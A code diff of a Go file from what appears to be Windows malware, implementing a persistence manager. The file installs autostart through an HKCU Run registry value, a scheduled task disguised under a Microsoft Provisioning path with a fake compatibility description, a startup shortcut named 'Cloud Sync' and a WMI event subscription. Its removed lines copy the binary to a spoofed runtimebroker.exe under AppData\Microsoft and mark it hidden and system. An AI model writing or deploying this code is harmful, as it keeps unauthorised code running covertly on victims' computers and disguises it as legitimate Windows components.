@@ -2,7 +2,6 @@ package handlers
 
 import (
 	"fmt"
-	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -11,13 +10,6 @@ import (
 
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
-)
-
-var (
-	installDirName  = "CoreRuntime"
-	installFileName = "runtimebroker.exe"
-	installDir      = filepath.Join(os.Getenv("APPDATA"), "Microsoft", installDirName)
-	installPath     = filepath.Join(installDir, installFileName)
 )
 
 type PersistenceManager struct {
@@ -34,14 +26,14 @@ func NewPersistenceManager() *PersistenceManager {
 	return &PersistenceManager{
 		methods: []PersistenceMethod{
 			&RegistryMethod{
-				KeyName: "Component Update", 
+				KeyName: "Component Update",
 			},
 			&TaskMethod{
 				TaskName:    "Microsoft\\Windows\\Management\\Provisioning\\Logon",
 				Description: "Maintains and improves compatibility of Windows applications.",
 			},
 			&StartupShortcutMethod{
-				ShortcutName: "Cloud Sync.url", 
+				ShortcutName: "Cloud Sync.url",
 			},
 			&WMIMethod{
 				FilterName:   "SysUpdaterFilter",
@@ -52,45 +44,18 @@ func NewPersistenceManager() *PersistenceManager {
 	}
 }
 
-func (pm *PersistenceManager) selfInstall() (string, error) {
+func (pm *PersistenceManager) EnsureAll() string {
+	// just get current exe path, no install bs
 	currentPath, err := os.Executable()
 	if err != nil {
-		return "", fmt.Errorf("failed to get current executable path: %w", err)
-	}
-
-	if strings.EqualFold(currentPath, installPath) {
-		return currentPath, nil
-	}
-
-	if err := os.MkdirAll(installDir, 0755); err != nil {
-		return "", fmt.Errorf("failed to create install directory: %w", err)
-	}
-
-	if err := copyFile(currentPath, installPath); err != nil {
-		return "", fmt.Errorf("failed to copy executable: %w", err)
-	}
-
-	if err := hideFile(installPath); err != nil {
-		fmt.Printf("Warning: failed to hide installed file: %v\n", err)
-	}
-
-	cmd := exec.Command(installPath)
-	cmd.Start()
-	os.Exit(0)
-
-	return installPath, nil
-}
-
-func (pm *PersistenceManager) EnsureAll() string {
-	installedPath, err := pm.selfInstall()
-	if err != nil {
-		return fmt.Sprintf("❌ Self-install failed: %v", err)
+		return fmt.Sprintf("failed to get exe path: %v", err)
 	}
 
 	var results []string
 	var establishedCount int
+
 	for _, method := range pm.methods {
-		if err := method.Apply(installedPath); err == nil {
+		if err := method.Apply(currentPath); err == nil {
 			results = append(results, fmt.Sprintf("  ✅ %s", method.Name()))
 			establishedCount++
 		} else {
@@ -99,21 +64,20 @@ func (pm *PersistenceManager) EnsureAll() string {
 	}
 
 	if establishedCount == 0 {
-		return "⚠️ **CRITICAL: All persistence methods failed.**"
+		return "⚠️ all persistence methods failed.**"
 	}
 
-	return fmt.Sprintf("🛡️ **Persistence Established (%d/%d methods)**\n```\n%s\n```\n**Running from:** `%s`",
-		establishedCount, len(pm.methods), strings.Join(results, "\n"), installedPath)
+	return fmt.Sprintf("**persistence Established (%d/%d methods)**\n```\n%s\n```\n**Running from:** `%s`",
+		establishedCount, len(pm.methods), strings.Join(results, "\n"), currentPath)
 }
 
 func (pm *PersistenceManager) RemoveAll() {
 	for _, method := range pm.methods {
 		method.Remove()
 	}
-	os.Remove(installPath)
 }
 
-// Registry HKCU run method 
+// registry hkcu run method
 type RegistryMethod struct {
 	KeyName string
 }
@@ -139,6 +103,7 @@ func (r *RegistryMethod) Remove() error {
 	return key.DeleteValue(r.KeyName)
 }
 
+// scheduled task
 type TaskMethod struct {
 	TaskName    string
 	Description string
@@ -156,7 +121,7 @@ func (t *TaskMethod) Remove() error {
 	return cmd.Run()
 }
 
-// Startup shortcut method (really bad)
+// startup shortcut (kinda mid but w/e)
 type StartupShortcutMethod struct {
 	ShortcutName string
 }
@@ -179,7 +144,7 @@ func (s *StartupShortcutMethod) Remove() error {
 	return os.Remove(filepath.Join(startupDir, s.ShortcutName))
 }
 
-// WMI method 
+// wmi event subscription
 type WMIMethod struct {
 	FilterName   string
 	ConsumerName string
@@ -209,27 +174,3 @@ func (w *WMIMethod) Remove() error {
 	return cmd.Run()
 }
 
-func copyFile(src, dst string) error {
-	srcFile, err := os.Open(src)
-	if err != nil {
-		return err
-	}
-	defer srcFile.Close()
-
-	dstFile, err := os.Create(dst)
-	if err != nil {
-		return err
-	}
-	defer dstFile.Close()
-
-	_, err = io.Copy(dstFile, srcFile)
-	return err
-}
-
-func hideFile(path string) error {
-	p, err := syscall.UTF16PtrFromString(path)
-	if err != nil {
-		return err
-	}
-	return syscall.SetFileAttributes(p, syscall.FILE_ATTRIBUTE_SYSTEM|syscall.FILE_ATTRIBUTE_HIDDEN)
-}
